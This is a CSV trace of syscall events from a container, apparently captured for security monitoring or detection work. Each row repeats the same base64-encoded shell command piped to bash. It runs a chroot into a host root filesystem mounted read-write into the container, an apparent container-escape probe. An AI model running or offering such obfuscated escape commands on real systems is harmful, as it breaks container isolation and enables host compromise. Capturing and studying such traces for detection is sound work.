evt_time,syscall_type,container_mounts,proc_args,proc_nthreads,proc_nchilds,proc_fdopencount,proc_vmsize,evt_args
22:10:00.178173595,connect,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,0,13812,res=-2(ENOENT) tuple=0->ffff8800852a0780 /var/run/nscd/socket
22:10:00.178180568,close,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,0,13812,fd=3
22:10:00.178181921,close,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,0,13812,res=0
22:10:00.178190547,socket,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,0,13812,domain=1 type=526337 proto=0
22:10:00.178197039,socket,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,1,13812,fd=3(<u>)
22:10:00.178198911,connect,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,1,13812,fd=3(<u>/var/run/nscd/socket) addr=/var/run/nscd/socket
22:10:00.178207249,connect,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,1,13812,res=-2(ENOENT) tuple=0->ffff8800852a0780 /var/run/nscd/socket
22:10:00.178208130,close,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,1,13812,fd=3(<u>/var/run/nscd/socket)
22:10:00.178208561,close,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,1,13812,res=0
22:10:00.178503544,open,/:/host:rw:true:rslave,-c echo IyEvYmluL2Jhc2gKdm9sdW1lcz0kKG1vdW50IHwgZ3JlcCBeL2Rldi8gfCBncmVwIC12IC9ldGMgfCBhd2sgJ3twcmludCAkM30nKQp2b2x1bWU9JChlY2hvICR2b2x1bWVzIHwgYXdrICd7cHJpbnQgJDF9JykKY2QgJHZvbHVtZQpwd2QKc3VkbyBjaHJvb3QgLyAvYmluL2Jhc2ggPDwgIkVPVCIKcHdkCmdyZXAgZG9ja2VyIC9wcm9jLzEvY2dyb3VwIHwgd2MgLWwKcHMKRU9UCmNkIC0= |base64 -d | bash -,2,1,0,9548,name=/etc/nsswitch.conf flags=4097(O_RDONLY|O_CLOEXEC) mode=0
